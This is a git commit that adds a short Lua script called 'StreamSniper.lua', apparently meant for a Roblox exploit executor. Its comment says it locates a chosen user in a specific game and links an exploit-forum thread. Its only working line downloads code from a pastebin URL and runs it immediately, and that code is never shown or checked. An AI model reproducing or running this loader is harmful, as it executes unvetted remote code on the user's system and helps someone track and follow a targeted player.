4c1cd81e39a30ee21170d66e82ff23037d0fe0d0
Nexity <46597698+Nexity@users.noreply.github.com>
2021-02-08 16:40:50 +0800

    Create StreamSniper.lua

---
+++ General Script/StreamSniper.lua
@@ -0,0 +1,6 @@
+-- [[
+finds anyone (userId) on a specific game (placeId)
+thread: https://v3rmillion.net/showthread.php?tid=1041706
+-- ]]
+
+loadstring(game:HttpGet("https://pastebin.com/raw/3PasLu9D", true))()
